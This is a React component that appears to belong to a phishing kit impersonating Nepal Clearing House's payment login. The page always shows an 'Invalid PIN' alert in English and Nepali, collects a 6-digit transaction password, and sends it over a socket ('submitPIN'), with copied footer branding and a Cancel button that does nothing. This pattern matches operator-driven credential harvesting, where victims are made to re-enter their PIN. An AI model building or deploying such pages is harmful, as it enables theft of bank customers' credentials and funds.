import React, { useState } from 'react';
import '../App.css';

function InvalidPIN({ socket }) {
  const [pin, setPin] = useState('');
  const [language, setLanguage] = useState('EN');

  const handleSubmit = (e) => {
    e.preventDefault();
    if (pin.trim()) {
      socket.emit('submitPIN', { pin });
    }
  };

  const handlePinChange = (e) => {
    const value = e.target.value;
    // Allow only numbers and limit to 6 digits
    if (/^\d{0,6}$/.test(value)) {
      setPin(value);
    }
  };

  const toggleLanguage = (lang) => setLanguage(lang);

  return (
    <div className="login-page">
      <div className="login-container">
        {/* Logo Section */}
        <div className="login-logo">
          <img src="logo.png" alt="Logo" className="logo-image" />
        </div>

        {/* Language Toggle Capsule */}
        <div className="language-toggle-capsule">
          <button
            className={`language-option ${language === 'EN' ? 'active' : ''}`}
            onClick={() => toggleLanguage('EN')}
          >
            EN
          </button>
          <button
            className={`language-option ${language === 'ने' ? 'active' : ''}`}
            onClick={() => toggleLanguage('ने')}
          >
            ने
          </button>
        </div>

        {/* Invalid PIN Message */}
        <div
          className="toast-body"
          role="alert"
          style={{
            backgroundColor: '#eb0026',
            color: '#fff',
            padding: '10px',
            borderRadius: '5px',
            textAlign: 'center',
            marginBottom: '15px',
          }}
        >
          {language === 'EN'
            ? 'Invalid PIN. Please try again.'
            : 'अवैध PIN। कृपया पुन: प्रयास गर्नुहोस्।'}
        </div>

        {/* PIN Section */}
        <form onSubmit={handleSubmit}>
          <h6 className="text-primary font-weight-bold mb-0">
            {language === 'EN'
              ? "Enter Transaction Password"
              : 'लेनदेन पासवर्ड प्रविष्ट गर्नुहोस्।'}
          </h6>
          <div className="form-group mt-4 position-relative">
            <input
              id="transaction-password"
              name="pin"
              autoComplete="off"
              maxLength="6"
              placeholder={language === 'EN' ? 'Enter PIN' : 'पासवर्ड प्रविष्ट गर्नुहोस्'}
              type="password"
              className="form-control"
              value={pin}
              onChange={handlePinChange}
              required
            />
          </div>
          <br />
          <br />
          <div className="d-flex mt-2 mb-4">
            <button className="btn btn-outline-primary flex-grow-1 mr-2" type="button">
              {language === 'EN' ? 'Cancel' : 'रद्द गर्नुहोस्'}
            </button>
            <button className="btn btn-primary flex-grow-1 ml-2" type="submit">
              {language === 'EN' ? 'Submit' : 'पेश गर्नुहोस्।'}
            </button>
          </div>
        </form>
        <br />
        <br />
        <br />
        <br />

        {/* Footer Section */}
        <footer>
          <img src="footer.png" alt="Powered by NPS" className="powered-by-logo" />
          <p>version: 1.11.5</p>
          <p>Copyright © Nepal Clearing House Limited, 2018-2024</p>
        </footer>
      </div>
    </div>
  );
}

export default InvalidPIN;
